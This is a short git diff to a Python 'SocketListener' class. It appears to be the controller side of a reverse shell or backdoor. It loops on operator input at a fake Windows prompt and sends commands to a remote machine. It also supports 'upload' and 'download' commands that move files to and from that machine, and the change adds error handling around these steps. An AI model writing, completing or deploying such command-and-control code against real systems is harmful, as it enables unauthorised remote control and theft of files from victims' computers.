@@ -58,15 +58,18 @@ class SocketListener:
         while True:
             command_input = raw_input("Windows C:\\User\\IEUser\\> ")
             command_input = command_input.split(" ")
-            command_output = self.command_execution(command_input).decode()
 
-            if command_input[0] == "upload":
-                file_contents = self.get_file_contents(command_input[1])
-                command_input.append(file_contents)
-            command_output = self.command_execution(command_input)
+            try:
+                if command_input[0] == "upload":
+                    file_contents = self.get_file_contents(command_input[1])
+                    command_input.append(file_contents)
 
-            if command_input[0] == "download":
-                command_output = self.save_file(command_input[1],command_output)
+                command_output = self.command_execution(command_input).decode()
+
+                if command_input[0] == "download" and "Error!!" not in command_output:
+                    command_output = self.save_file(command_input[1],command_output)
+            except Exception:
+                command_output = "Error!! Check command input."
 
             print(command_output)
 
